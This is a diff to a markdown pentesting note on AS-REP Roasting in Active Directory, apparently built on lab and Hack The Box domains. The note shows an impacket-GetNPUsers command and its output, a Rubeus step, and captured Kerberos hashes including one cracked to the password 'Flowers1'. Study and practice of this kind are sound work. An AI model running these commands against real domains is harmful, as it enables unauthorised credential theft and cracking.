@@ -1,7 +1,5 @@
 # AS-REP Roasting
 
-
-
 ## Recap
 
 The first step of authentication in Kerberos is to send an AS-REQ to the domain controller. If the authentication is successful, a AS-REP is sent to the AD user containing the session key and Ticket Granting Ticket (TGT). This is called _**Kerberos Pre-authentication**_.
@@ -36,7 +34,7 @@ The output shows that dave has kerberos pre-authentication set to disabled. He's
 $krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f33...751a876a756757dc22:Flowers1
 </code></pre>
 
-##
+
 
 ## AS-REP Roasting without credentials
 
@@ -58,11 +56,29 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:20a92d6ea68903d4bb8aa15dc9592fdf$98ce719d2b
 
 ```
 
-##
+
+
+## AS-REP Roasting with Username files
+
+If we have a <mark style="color:yellow;">**usernames.txt**</mark> file we can add it.&#x20;
+
+```shell-session
+kali@kali$ impacket-GetNPUsers -usersfile usernames.txt -request -format hashcat -outputfile ASREPRoastable.txt -dc-ip intelligence.htb 'intelligence.htb/'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+```
+
+
 
 ## AS-REP Roasting on Windows
 
-We can use Rubeus to perform AS-REP Roasting on Windows.
+If we have a shell, it's easy to utilize Rubeus to perform AS-REP Roasting on Windows.
 
 ```powershell
 PS C:\Users\jeff> cd C:\Tools
